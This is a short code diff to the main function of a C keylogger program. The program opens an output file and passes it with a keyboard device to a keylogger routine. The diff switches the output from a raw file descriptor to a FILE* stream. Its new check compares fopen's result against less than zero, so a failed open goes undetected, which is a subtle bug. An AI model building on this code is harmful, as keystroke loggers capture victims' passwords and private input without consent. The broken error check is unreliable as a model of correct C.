@@ -20,7 +20,7 @@ int main(int argc, char *argv[]) {
     puts(get_platform_name());
 
     // output file descriptor
-    int writeout;
+    FILE* writeout;
 
     // keyboard file descriptor
     // only for linux usage
@@ -35,7 +35,7 @@ int main(int argc, char *argv[]) {
         print_usage_and_quit(argv[0]);
     }
     else if(file) {
-        if((writeout = open(option_input, O_WRONLY | O_APPEND | O_CREAT, S_IROTH)) < 0){
+        if((writeout = fopen(option_input, "ab+")) < 0){
             printf("Error opening file %s: %s\n", argv[2], strerror(errno));
             return 1;
         }
@@ -55,7 +55,7 @@ int main(int argc, char *argv[]) {
     #endif
 
     keylogger(keyboard, writeout);
-    close(writeout);
+    fclose(writeout);
 
 }
 
